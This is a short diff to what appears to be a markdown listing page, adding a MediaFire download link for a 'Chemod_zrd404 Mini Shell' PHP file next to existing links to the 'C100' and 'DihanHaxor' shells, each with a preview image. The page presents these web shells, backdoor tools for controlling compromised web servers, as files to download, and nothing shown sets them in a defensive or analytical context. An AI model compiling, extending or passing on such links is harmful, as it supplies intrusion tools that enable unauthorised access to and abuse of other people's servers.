@@ -47,6 +47,9 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/zu96h5fol5obsji/c100.php/file">C100</a>
 <img src="https://i.imgur.com/hWDk2ak.png" alt="beruangsalju profile">
   
+# <a href="https://www.mediafire.com/file/a8sx4leb4eeiwft/chemod.php/file">Chemod_zrd404 Mini Shell</a>
+<img src="https://i.imgur.com/gRl8D5X.jpg" alt="beruangsalju profile">
+  
 # <a href="https://www.mediafire.com/file/sqqcs37r9vzjhpn/dihanhaxor_shell.php/file">DihanHaxor</a>
 <img src="https://imgur.com/20Fv1Y0.png" alt="beruangsalju profile">
 
